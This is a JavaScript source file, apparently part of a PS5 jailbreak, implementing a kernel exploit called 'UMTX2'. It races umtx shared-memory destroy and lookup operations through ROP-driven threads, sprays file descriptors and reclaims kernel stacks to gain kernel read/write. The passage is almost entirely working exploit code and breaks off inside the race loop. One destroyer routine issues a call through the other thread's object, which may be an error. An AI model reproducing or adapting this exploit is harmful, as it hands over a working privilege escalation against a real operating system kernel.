// @ts-check

/** 
 * @typedef {Object} KernelRW
 * 
 * @property {number} masterSock
 * @property {number} victimSock
 * 
 * @property {int64} kdataBase
 * @property {int64} ktextBase
 * 
 * @property {function(int64):Promise<number>} read1
 * @property {function(int64):Promise<number>} read2
 * @property {function(int64):Promise<number>} read4
 * @property {function(int64):Promise<int64>} read8
 * 
 * @property {function(int64, number):Promise<void>} write1
 * @property {function(int64, number):Promise<void>} write2
 * @property {function(int64, number):Promise<void>} write4
 * @property {function(int64, int64):Promise<void>} write8
 * 
 * @property {int64} curthrAddr
 * @property {int64} curprocAddr
 * @property {int64} procUcredAddr
 * @property {int64} procFdAddr
 * 
 * @property {int64} pipeMem
 * @property {int64} pipeAddr
 * 
 */


/**
 * @param {WebkitPrimitives} p 
 * @param {worker_rop} chain 
 * @param {function(string, LogLevel):Promise<void>} [log] 
 * @returns 
 */
async function runUmtx2Exploit(p, chain, log = async () => { }) {
    const totalStartTime = performance.now();

    const debug = false;
    const doInvalidKstackMunmap = true;

    /**
     * @param {number} ms 
     * @returns {string}
     */
    function toHumanReadableTime(ms) {
        const seconds = ms / 1000;
        const minutes = seconds / 60;
        const hours = minutes / 60;

        let str = "";
        if (hours >= 1) {
            str += `${Math.floor(hours)}h `;
        }
        if (minutes >= 1) {
            str += `${Math.floor(minutes % 60)}m `;
        }
        if (seconds >= 1) {
            str += `${Math.floor(seconds % 60)}s `;
        }
        str += `${Math.floor(ms % 1000)}ms`;

        return str;
    }

    const config = {
        max_attempts: 100,
        max_race_attempts: 512,
        num_spray_fds: 0x28,
        num_kprim_threads: 0x180,
    };

    const thread_config = {
        main_thread: { core: 11, prio: 256 },
        destroyer_thread0: { core: 13, prio: 256 },
        destroyer_thread1: { core: 14, prio: 256 },
        lookup_thread: { core: 15, prio: 767 },
        reclaim_thread: { core: -1, prio: 450 }
    }

    const BUMP_ALLOCATOR_SIZE = 0x100000; // 1MB

    const MAP_PRIVATE = 0x2;
    const MAP_ANONYMOUS = 0x1000;
    const PROT_READ = 0x1;
    const PROT_WRITE = 0x2;

    const bumpAllocatorBuffer = await chain.syscall(SYS_MMAP, 0, BUMP_ALLOCATOR_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if ((bumpAllocatorBuffer.low << 0) == -1) {
        throw new Error("mmap failed");
    }
    let bumpAllocatorPos = 0;

    /**
     * @param {number} size 
     * @returns {int64}
     */
    function alloc(size) {
        if (bumpAllocatorPos + size > BUMP_ALLOCATOR_SIZE) {
            throw new Error("Bump allocator full");
        }

        const ptr = bumpAllocatorBuffer.add32(bumpAllocatorPos);
        bumpAllocatorPos += size;
        return ptr;
    }

    /**
     * 
     * @param {int64} mask_addr 
     * @returns {number}
     */
    function getCoreIndex(mask_addr) {
        let num = p.read4(mask_addr);
        let position = 0;
        while (num > 0) {
            num = num >>> 1;
            position = position + 1;
        }
        return position - 1;
    }

    const minusOneInt32 = 0xFFFFFFFF;
    const minusOneInt64 = new int64(0xFFFFFFFF, 0xFFFFFFFF);

    /**
     * @returns {Promise<number>}
     */
    async function getCurrentCore() {
        const level = 3;
        const which = 1;
        const id = minusOneInt64;
        const setsize = 0x10;
        const mask = alloc(0x10);
        const res = await chain.syscall_int32(SYS_PS4_CPUSET_GETAFFINITY, level, which, id, setsize, mask);
        if (res != 0) {
            throw new Error("get_current_core failed");
        }

        return getCoreIndex(mask);
    }

    const RTP_LOOKUP = 0;
    const RTP_SET = 1;

    // const PRI_ITHD = 1;      /* Interrupt thread. */
    const PRI_REALTIME = 2;	 /* Real time process. */
    const PRI_TIMESHARE = 3; /* Time sharing process. */
    const PRI_IDLE = 4;      /* Idle process. */
    /**
     * @param {number} type 
     * @param {number} [prio] 
     * @param {number} [prio_type] 
     */
    async function rtprio(type, prio = 0, prio_type = PRI_REALTIME) {
        const rtprio = alloc(0x4);
        p.write2(rtprio, prio_type);
        p.write2(rtprio.add32(0x2), prio);

        const res = await chain.syscall_int32(SYS_RTPRIO_THREAD, type, 0, rtprio);
        if (res != 0) {
            throw new Error("rtprio failed");
        }

        if (type == RTP_LOOKUP) {
            return p.read4(rtprio.add32(0x2)) << 0;
        }

        return 0;
    }

    /**
     * @param {number} prio 
     * @param {number} prio_type 
     */
    async function setRtprio(prio, prio_type = PRI_REALTIME) {
        return await rtprio(RTP_SET, prio, prio_type);
    }

    /**
     * @returns {Promise<number>}
     */
    async function getRtprio() {
        return await rtprio(RTP_LOOKUP);
    }

    /**
     * @param {rop} thread 
     * @param {number} prio 
     */
    function threadSetRtPrio(thread, prio) {
        const rtprio = alloc(0x4);
        p.write2(rtprio, PRI_REALTIME);
        p.write2(rtprio.add32(0x2), prio);

        thread.self_healing_syscall(SYS_RTPRIO_THREAD, 1, 0, rtprio);
    }


    /**
     * @param {number} core 
     */
    async function pinToCore(core) {
        const level = 3;
        const which = 1;
        const id = minusOneInt64;
        const setsize = 0x10;
        const mask = alloc(0x10);
        p.write2(mask, 1 << core);

        return await chain.syscall_int32(SYS_PS4_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }

    /**
     * @param {rop} thread 
     * @param {number} core 
     */
    function threadPinToCore(thread, core) {
        const level = 3;
        const which = 1;
        const id = minusOneInt64;
        const setsize = 0x10;
        const mask = alloc(0x10);
        p.write2(mask, 1 << core);

        thread.self_healing_syscall(SYS_PS4_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }


    /**
     * @param {thread_rop} thread 
     * @param {int64} addr 
     * @param {number} branch_type 
     * @param {int64|number} compare_value 
     */
    function threadWaitWhile(thread, addr, branch_type, compare_value, dereference_compare_value = false) {
        thread.while(addr, branch_type, compare_value, dereference_compare_value, () => {
            thread.self_healing_syscall(SYS_SCHED_YIELD);
        });
    }





    // ----------------------------------------

    const PIPE_SIZE = 0x10000;
    const pipe_buf = alloc(PIPE_SIZE);

    const pipeSlowFds = alloc(0x8);
    const pipeSlowRes = await chain.syscall_int32(SYS_PIPE2, pipeSlowFds, 0);
    if (pipeSlowRes != 0) {
        throw new Error("pipe2 failed");
    }

    const pipeSlowReadFd = p.read4(pipeSlowFds);
    const pipeSlowWriteFd = p.read4(pipeSlowFds.add32(0x4));

    const UMTX_OP_SHM = 26; // 25 on BSD
    const UMTX_SHM_CREAT = 0x0001;
    const UMTX_SHM_LOOKUP = 0x0002;
    const UMTX_SHM_DESTROY = 0x0004;

    // Create a UMTX key area to use, these just have to be valid pointers
    const sprayFdsBuf = alloc((config.num_spray_fds * 2) * 0x8);
    const primaryShmKeyBuf = alloc(0x8);
    const secondaryShmKeyBuf = alloc(0x8);

    const commonThreadData = {
        exit: alloc(0x8),
        start: alloc(0x8),
        resume: alloc(0x8)
    };

    const threadStatus = {
        DEFAULT: 0,
        READY: 1,
        DONE: 2,
        EXITED: 3
    };

    const lookupThreadData = {
        status: alloc(0x4),
        cpu: alloc(0x8),
        fd: alloc(0x8)
    };
    const lookupThread = new thread_rop(p, chain, "rop_thread_lookup");

    function resetLookupThreadState() {
        p.write4(lookupThreadData.status, threadStatus.DEFAULT);
        p.write8(lookupThreadData.cpu, 0);
        p.write8(lookupThreadData.fd, minusOneInt64);
    }

    function resetLookupThreadRop() {
        resetLookupThreadState();

        lookupThread.clear();

        threadPinToCore(lookupThread, thread_config.lookup_thread.core);
        threadSetRtPrio(lookupThread, thread_config.lookup_thread.prio);
        lookupThread.fcall(p.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        lookupThread.write_result(lookupThreadData.cpu);

        lookupThread.while(commonThreadData.exit, lookupThread.branch_types.EQUAL, 0, false, () => {
            lookupThread.push_write4(lookupThreadData.status, threadStatus.READY);

            threadWaitWhile(lookupThread, commonThreadData.start, lookupThread.branch_types.EQUAL, 0);

            lookupThread.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_LOOKUP, primaryShmKeyBuf);
            lookupThread.write_result(lookupThreadData.fd);

            // https://github.com/PS5Dev/PS5-UMTX-Jailbreak/blob/2cf6778ebe89ff35255e1c228826d0d2155e9d2a/document/en/ps5/exploit.js#L705
            // HACK: sonys code is shit, so we need to account for the fact that ESRCH can be returned without setting error flag
            // if (fd == 3) { fd = -1; }
            lookupThread.if(lookupThreadData.fd, lookupThread.branch_types.EQUAL, 3, false, () => {
                lookupThread.push_write8(lookupThreadData.fd, minusOneInt64);
            });

            lookupThread.push_write4(lookupThreadData.status, threadStatus.DONE);
            threadWaitWhile(lookupThread, commonThreadData.resume, lookupThread.branch_types.EQUAL, 0);
        });

        lookupThread.push_write4(lookupThreadData.status, threadStatus.EXITED);
    }

    const destroyerThread0Data = {
        status: alloc(0x4),
        cpu: alloc(0x8),
        counter: alloc(0x8),
        destroyCount: alloc(0x8),
        shmOpCount: alloc(0x8),

        resStore: alloc(0x8),
        ftruncateSize: alloc(0x8)
    };
    const destroyerThread0 = new thread_rop(p, chain, "rop_thread_destroyer0");
    function resetDestroyerThread0State() {
        p.write4(destroyerThread0Data.status, threadStatus.DEFAULT);
        p.write8(destroyerThread0Data.cpu, 0);
        p.write8(destroyerThread0Data.counter, 0);
        p.write4(destroyerThread0Data.destroyCount, 0);
        p.write4(destroyerThread0Data.shmOpCount, 0);
    }

    const destroyerThread1Data = {
        status: alloc(0x4),
        cpu: alloc(0x8),
        counter: alloc(0x8),
        destroyCount: alloc(0x8),
        shmOpCount: alloc(0x8),

        resStore: alloc(0x8),
        ftruncateSize: alloc(0x8)
    };
    const destroyerThread1 = new thread_rop(p, chain, "rop_thread_destroyer1");
    function resetDestroyerThread1State() {
        p.write4(destroyerThread1Data.status, threadStatus.DEFAULT);
        p.write8(destroyerThread1Data.cpu, 0);
        p.write8(destroyerThread1Data.counter, 0);
        p.write4(destroyerThread1Data.destroyCount, 0);
        p.write4(destroyerThread1Data.shmOpCount, 0);
    }

    function resetDestroyerThread0Rop() {
        resetDestroyerThread0State();

        destroyerThread0.clear();

        threadPinToCore(destroyerThread0, thread_config.destroyer_thread0.core);
        threadSetRtPrio(destroyerThread0, thread_config.destroyer_thread0.prio);
        destroyerThread0.fcall(p.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        destroyerThread0.write_result(destroyerThread0Data.cpu);

        destroyerThread0.while(commonThreadData.exit, destroyerThread0.branch_types.EQUAL, 0, false, () => {
            destroyerThread0.push_write4(destroyerThread0Data.status, threadStatus.READY);

            threadWaitWhile(destroyerThread0, commonThreadData.start, destroyerThread0.branch_types.EQUAL, 0);

            // do the destroy
            destroyerThread0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, primaryShmKeyBuf);
            destroyerThread0.write_result(destroyerThread0Data.resStore);

            destroyerThread0.if(destroyerThread0Data.resStore, destroyerThread0.branch_types.EQUAL, 0, false, () => {
                destroyerThread0.increment_dword(destroyerThread0Data.destroyCount);
            });

            destroyerThread0.increment_dword(destroyerThread0Data.shmOpCount);

            // wait for lookup thread
            // while (lookupThreadData.status < DONE) { sched_yield(); }
            threadWaitWhile(destroyerThread0, lookupThreadData.status, destroyerThread0.branch_types.LESSER, threadStatus.DONE);

            // wait for destroyer 1
            // while (destroyerThread1Data.shmOpCount == 0) { sched_yield(); }
            threadWaitWhile(destroyerThread0, destroyerThread1Data.shmOpCount, destroyerThread0.branch_types.EQUAL, 0);

            destroyerThread0.if(destroyerThread0Data.destroyCount, destroyerThread0.branch_types.EQUAL, 1, false, () => {
                destroyerThread0.if(destroyerThread1Data.destroyCount, destroyerThread0.branch_types.EQUAL, 1, false, () => {
                    // if (lookupThreadData.fd > 0)
                    destroyerThread0.if(lookupThreadData.fd, destroyerThread0.branch_types.GREATER, 0, false, () => {
                        for (let i = 0; i < (config.num_spray_fds * 2); i += 2) {
                            const fdStoreAddr = sprayFdsBuf.add32(0x8 * i);

                            destroyerThread0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, secondaryShmKeyBuf);
                            destroyerThread0.write_result(fdStoreAddr);

                            // ftruncate(fd, fd * PAGE_SIZE)
                            destroyerThread0.multiply_by_0x4000(fdStoreAddr, destroyerThread0Data.ftruncateSize);
                            destroyerThread0.self_healing_syscall_2(SYS_FTRUNCATE, fdStoreAddr, true, destroyerThread0Data.ftruncateSize, true);

                            destroyerThread0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, secondaryShmKeyBuf);
                        }
                    });
                });
            });

            destroyerThread0.push_write4(destroyerThread0Data.status, threadStatus.DONE);

            threadWaitWhile(destroyerThread0, commonThreadData.resume, destroyerThread0.branch_types.EQUAL, 0);
        });

        destroyerThread0.push_write4(destroyerThread0Data.status, threadStatus.EXITED);
    };


    function resetdestroyerThread1Rop() {
        resetDestroyerThread1State();

        destroyerThread1.clear();

        threadPinToCore(destroyerThread1, thread_config.destroyer_thread1.core);
        threadSetRtPrio(destroyerThread1, thread_config.destroyer_thread1.prio);
        destroyerThread1.fcall(p.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        destroyerThread1.write_result(destroyerThread1Data.cpu);

        destroyerThread1.while(commonThreadData.exit, destroyerThread1.branch_types.EQUAL, 0, false, () => {
            destroyerThread1.push_write4(destroyerThread1Data.status, threadStatus.READY);

            threadWaitWhile(destroyerThread1, commonThreadData.start, destroyerThread1.branch_types.EQUAL, 0);

            // do the destroy
            destroyerThread1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, primaryShmKeyBuf);
            destroyerThread1.write_result(destroyerThread1Data.resStore);

            destroyerThread1.if(destroyerThread1Data.resStore, destroyerThread1.branch_types.EQUAL, 0, false, () => {
                destroyerThread1.increment_dword(destroyerThread1Data.destroyCount);
            });

            destroyerThread1.increment_dword(destroyerThread1Data.shmOpCount);

            // wait for lookup thread
            threadWaitWhile(destroyerThread1, lookupThreadData.status, destroyerThread1.branch_types.LESSER, threadStatus.DONE);

            // wait for destroyer 0
            threadWaitWhile(destroyerThread1, destroyerThread0Data.shmOpCount, destroyerThread1.branch_types.EQUAL, 0);

            destroyerThread1.if(destroyerThread1Data.destroyCount, destroyerThread1.branch_types.EQUAL, 1, false, () => {
                destroyerThread1.if(destroyerThread0Data.destroyCount, destroyerThread1.branch_types.EQUAL, 1, false, () => {
                    // if (lookupThreadData.fd > 0)
                    destroyerThread1.if(lookupThreadData.fd, destroyerThread1.branch_types.GREATER, 0, false, () => {
                        for (let i = 1; i < (config.num_spray_fds * 2); i += 2) {
                            const fdStoreAddr = sprayFdsBuf.add32(0x8 * i);

                            destroyerThread1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, secondaryShmKeyBuf);
                            destroyerThread1.write_result(fdStoreAddr);

                            // ftruncate(fd, fd * PAGE_SIZE)
                            destroyerThread1.multiply_by_0x4000(fdStoreAddr, destroyerThread1Data.ftruncateSize);
                            destroyerThread0.self_healing_syscall_2(SYS_FTRUNCATE, fdStoreAddr, true, destroyerThread1Data.ftruncateSize, true);


                            destroyerThread1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, secondaryShmKeyBuf);
                        }
                    });
                });
            });

            destroyerThread1.push_write4(destroyerThread1Data.status, threadStatus.DONE);

            threadWaitWhile(destroyerThread1, commonThreadData.resume, destroyerThread1.branch_types.EQUAL, 0);
        });

        destroyerThread1.push_write4(destroyerThread1Data.status, threadStatus.EXITED);
    };

    const kprimThreads = Array(config.num_kprim_threads);

    const kprimCommonData = {
        status: alloc(config.num_kprim_threads * 0x4),
        exit: alloc(0x8),
        thr_index: alloc(0x8),
        cmd: alloc(0x8),
        cmdCounter: alloc(0x8),
        readCounter: alloc(0x8),
        writeCounter: alloc(0x8)
    };

    const kstackKernelRwCmd = {
        NOP: 0,
        READ_QWORD: 1,
        WRITE_QWORD: 2,
        EXIT: 256,
    };

    async function waitForKprimThreadsState(states, minCount = config.num_kprim_threads) {
        if (!Array.isArray(states)) {
            states = [states];
        }

        while (true) {
            await new Promise((resolve) => setTimeout(resolve, 10));

            let matchedCount = 0;
            for (let i = 0; i < config.num_kprim_threads; i++) {
                const currentState = p.read4(kprimCommonData.status.add32(i * 0x4));
                if (states.includes(currentState)) {
                    matchedCount++;
                }
            }

            if (matchedCount >= minCount) {
                break;
            }
        }
    }

    async function resetKprimThreadsState() {
        // ask to exit if they are running
        p.write8(kprimCommonData.thr_index, minusOneInt64);
        p.write8(kprimCommonData.exit, 1);

        await waitForKprimThreadsState([threadStatus.EXITED, threadStatus.DEFAULT]);

        p.write8(kprimCommonData.exit, 0);
        p.write8(kprimCommonData.cmd, 0);
        p.write8(kprimCommonData.cmdCounter, 0);
        p.write8(kprimCommonData.readCounter, 0);
        p.write8(kprimCommonData.writeCounter, 0);
    }

    async function resetKprimThreads() {
        await resetKprimThreadsState();

        const timeout = 1; // sec

        for (let i = 0; i < config.num_kprim_threads; i++) {
            const currentThreadStatusAddr = kprimCommonData.status.add32(i * 0x4);

            const ogStatus = p.read4(currentThreadStatusAddr);
            if (ogStatus != threadStatus.DEFAULT && ogStatus != threadStatus.EXITED) {
                throw new Error("kprim thread alive?");
            }

            p.write4(currentThreadStatusAddr, threadStatus.DEFAULT);

            if (!kprimThreads[i]) {
                kprimThreads[i] = new thread_rop(p, chain, `kprim_${i}`, 0x1000, 0x200);
                kprimThreads[i].customData = {
                    cookie: alloc(0x10),
                    timeval: alloc(0x10)
                };

                p.write8(kprimThreads[i].customData.timeval, timeout);
            }

            /** @type {thread_rop} */
            const thread = kprimThreads[i];

            // @ts-ignore
            const threadData = thread.customData;

            thread.clear();

            threadSetRtPrio(thread, thread_config.reclaim_thread.prio);

            thread.push_write4(currentThreadStatusAddr, threadStatus.READY);

            thread.while(kprimCommonData.exit, thread.branch_types.EQUAL, 0, false, () => {
                thread.push_write8(threadData.cookie, 0x13370000 + i);
                thread.self_healing_syscall(SYS_SELECT, 1, threadData.cookie, 0, 0, threadData.timeval);
                thread.self_healing_syscall(SYS_SCHED_YIELD);
            });

            thread.if(kprimCommonData.thr_index, thread.branch_types.EQUAL, i, false, () => {
                thread.while(kprimCommonData.cmd, thread.branch_types.LESSER, kstackKernelRwCmd.EXIT, false, () => {

                    // wait until it receives command
                    threadWaitWhile(thread, kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.NOP);

                    // read cmd
                    thread.if(kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.READ_QWORD, false, () => {
                        thread.increment_dword(kprimCommonData.readCounter);
                        thread.self_healing_syscall(SYS_WRITE, pipeSlowWriteFd, pipe_buf, 8);
                    });

                    // write cmd
                    thread.if(kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.WRITE_QWORD, false, () => {
                        thread.increment_dword(kprimCommonData.writeCounter);
                        thread.self_healing_syscall(SYS_READ, pipeSlowReadFd, pipe_buf, 8);
                    });

                    thread.increment_dword(kprimCommonData.cmdCounter);

                    thread.if_not(kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.EXIT, false, () => {
                        // reset for next run
                        thread.push_write4(kprimCommonData.cmd, kstackKernelRwCmd.NOP);
                    });
                });
            });

            thread.push_write4(currentThreadStatusAddr, threadStatus.EXITED);
        }
    }

    async function waitForRaceThreadsState(state) {
        while (true) {
            await new Promise((resolve) => setTimeout(resolve, 2));

            const lookupThreadStatus = p.read4(lookupThreadData.status);
            if (lookupThreadStatus != state) {
                continue;
            }

            const destroyerThread0Status = p.read4(destroyerThread0Data.status);
            if (destroyerThread0Status != state) {
                continue;
            }

            const destroyerThread1Status = p.read4(destroyerThread1Data.status);
            if (destroyerThread1Status != state) {
                continue;
            }

            return;
        }
    }


    async function checkMemoryAccess(addr, checkSize = 1) {
        const pipesBuf = alloc(0x8);
        const pipesRes = await chain.syscall_int32(SYS_PIPE2, pipesBuf, 0);
        if (pipesRes != 0) {
            await log("pipe2 failed", LogLevel.ERROR);
            return false;
        }

        const readFd = p.read4(pipesBuf);
        const writeFd = p.read4(pipesBuf.add32(0x4));

        const checkBuf = alloc(checkSize);

        const actualWriteSize = await chain.syscall_int32(SYS_WRITE, writeFd, addr, checkSize);
        let result = actualWriteSize == checkSize;
        if (!result) {
            result = false;
        }

        if (result && actualWriteSize > 1) {
            const actualReadSize = await chain.syscall_int32(SYS_READ, readFd, checkBuf, checkSize);
            if (actualReadSize != actualWriteSize) {
                result = false;
            }
        }

        chain.add_syscall(SYS_CLOSE, readFd);
        chain.add_syscall(SYS_CLOSE, writeFd);

        await chain.run();

        return result;
    }


    /**
     * 
     * @param {int64} kstack 
     * @returns {number|null} - kprim id
     */
    function verifyKstack(kstack) {
        const cnt = 0x1000 / 8;

        for (let i = 0; i < cnt; i++) {
            const qword = p.read8(kstack.add32(0x3000 + (i * 8)));
            const num = qword.low << 0;
            if (num == 0) {
                continue;
            }

            if ((num >> 16) == 0x1337) {
                return num & 0xfff;
            }
        }

        return null;
    }


    const OFFSET_STAT_SIZE = 0x48;
    const getFdSizeTempBuffer = alloc(0x100);
    async function getFdSize(fd) {
        const res = await chain.syscall_int32(SYS_FSTAT, fd, getFdSizeTempBuffer);
        if (res == -1) {
            return null;
        }

        return p.read4(getFdSizeTempBuffer.add32(OFFSET_STAT_SIZE));
    }

    async function getShmFdFromSize(lookupFd) {
        if (lookupFd == -1) {
            return null;
        }

        let sizeFd = await getFdSize(lookupFd);
        if (!sizeFd) {
            return null;
        }

        sizeFd /= 0x4000;
        if (sizeFd <= 0x6 || sizeFd >= 0x400 || sizeFd == lookupFd) {
            return null;
        }

        return sizeFd;
    }


    let fdsToFix = [];
    let kstacksToFix = [];


    async function resetCommonData() {
        const lookupFd = p.read4(lookupThreadData.fd) << 0;

        if (lookupFd > 0 && !fdsToFix.includes(lookupFd)) {
            chain.add_syscall(SYS_CLOSE, lookupFd);
            p.write4(lookupThreadData.fd, -1);
        }

        chain.add_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, primaryShmKeyBuf);
        chain.add_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, secondaryShmKeyBuf);

        await chain.run();

        p.write8(commonThreadData.exit, 0);
        p.write8(commonThreadData.start, 0);
        p.write8(commonThreadData.resume, 0);
    }

    ///////////////////////////////////////////////////////////////////////
    // Start
    ///////////////////////////////////////////////////////////////////////


    const ogCore = await getCurrentCore();
    if (debug) await log(`Main thread original core: ${ogCore}`, LogLevel.DEBUG);

    const ogPrio = await getRtprio();
    if (debug) await log(`Main thread original prio: ${ogPrio}`, LogLevel.DEBUG);

    await pinToCore(thread_config.main_thread.core);
    await setRtprio(thread_config.main_thread.prio);
    if (debug) await log("Set main thread core and prio", LogLevel.DEBUG);

    let winnerFd = null;
    let winnerLookupFd = null;
    let kstack = null;

    let checkMemoryAccessFailCount = 0;

    for (let i = 1; i <= config.max_attempts; i++) {
        await log(`Attempt ${i}`, LogLevel.LOG);

        resetLookupThreadRop();
        resetDestroyerThread0Rop();
        resetdestroyerThread1Rop();

        p.write8(commonThreadData.exit, 0);
        p.write8(commonThreadData.start, 0);
        p.write8(commonThreadData.resume, 0);

        winnerFd = null;
        winnerLookupFd = null;
        kstack = null;

        // Start threads - we made sure previous ones exited at the end of this loop
        await lookupThread.spawn_thread();
        await destroyerThread0.spawn_thread();
        await destroyerThread1.spawn_thread();
        if (debug) await log("Spawned threads, waiting for them to be ready...", LogLevel.DEBUG);

        await waitForRaceThreadsState(threadStatus.READY);
        if (debug) await log("All threads ready", LogLevel.DEBUG);

        let count = 0;

        const mainFdBuf = alloc(0x8);
        const mainFdSizeBuf = alloc(0x8);

        const beforeRaceTime = performance.now();
        showTemporaryAlert("Triggering race...", LogLevel.LOG);

        for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
            if (i2 % 2 == 0) {
                if (debug) {
                    await log(`Race attempt ${i}-${i2} (mem access fail count: ${checkMemoryAccessFailCount})`, LogLevel.INFO | LogLevel.FLAG_TEMP);
                } else {
                    await log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
                }
            }

            